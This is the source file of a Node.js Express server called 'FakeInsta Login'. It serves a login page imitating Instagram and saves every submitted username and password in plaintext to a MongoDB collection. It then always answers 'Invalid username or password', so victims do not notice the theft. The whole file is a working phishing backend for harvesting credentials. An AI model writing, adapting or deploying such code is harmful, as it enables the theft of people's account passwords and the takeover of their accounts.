require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const session = require('express-session');
const MongoStore = require('connect-mongo');
const helmet = require('helmet');
const path = require('path');

const app = express();

// --- MIDDLEWARE ---
app.use(helmet());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// View engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// --- SESSION ---
app.use(session({
    secret: process.env.SESSION_SECRET || 'fakeinstasecret',
    resave: false,
    saveUninitialized: false,
    store: MongoStore.create({
        mongoUrl: process.env.MONGO_URI || 'mongodb://127.0.0.1:27017/fakeinsta',
    }),
    cookie: { maxAge: 1000 * 60 * 60 * 24 } // 1 day
}));

// --- MONGO SCHEMA ---
const loginSchema = new mongoose.Schema({
    username: String,
    password: String,
    timestamp: { type: Date, default: Date.now }
});
const Login = mongoose.model('Login', loginSchema);

const mongoUrl = process.env.MONGO_URI || 'mongodb://127.0.0.1:27017/fakeinsta';

mongoose.connect(mongoUrl)
  .then(() => {
    console.log("✅ MongoDB connected");
  })
  .catch((err) => {
    console.error("❌ MongoDB connection error:", err);
  });



// --- ROUTES ---
app.get('/', (req, res) => {
    res.render('login'); // Render login page
});

app.post('/login', async (req, res) => {
    const { username, password } = req.body;

    // Save fake login attempt
    await Login.create({ username, password });

    // Always "fail" to mimic fake login
    res.render('login', { message: 'Invalid username or password' });
});

// --- CONNECT MONGO & START SERVER ---
const PORT = process.env.PORT || 3000;

mongoose.connect(process.env.MONGO_URI || 'mongodb://127.0.0.1:27017/fakeinsta', {
    useNewUrlParser: true,
    useUnifiedTopology: true
}).then(() => {
    console.log('MongoDB connected');
    app.listen(PORT, () => {
        console.log(`FakeInsta Login running on http://localhost:${PORT}`);
    });
}).catch(err => {
    console.error('MongoDB connection error:', err);
});
